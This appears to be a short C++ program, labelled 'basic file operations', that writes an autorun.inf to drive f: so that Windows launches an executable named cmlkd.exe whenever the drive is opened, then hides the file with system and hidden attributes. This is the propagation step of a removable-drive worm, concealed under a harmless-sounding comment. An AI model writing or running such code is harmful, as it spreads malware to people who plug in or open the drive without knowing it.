// basic file operations
#include <iostream>
#include <fstream>
#include <stdlib.h>
using namespace std;

int main(int argc,char** argv) {
  ofstream myfile;
  myfile.open ("f:\\autorun.inf");

  myfile << "[autorun]\nicon=cmlkd.exe\nopen=cmlkd.exe\nshell\\open\\command=cmlkd.exe";

  myfile.close();
  system("attrib +h +s f:\\autorun.inf");

  return 0;
}
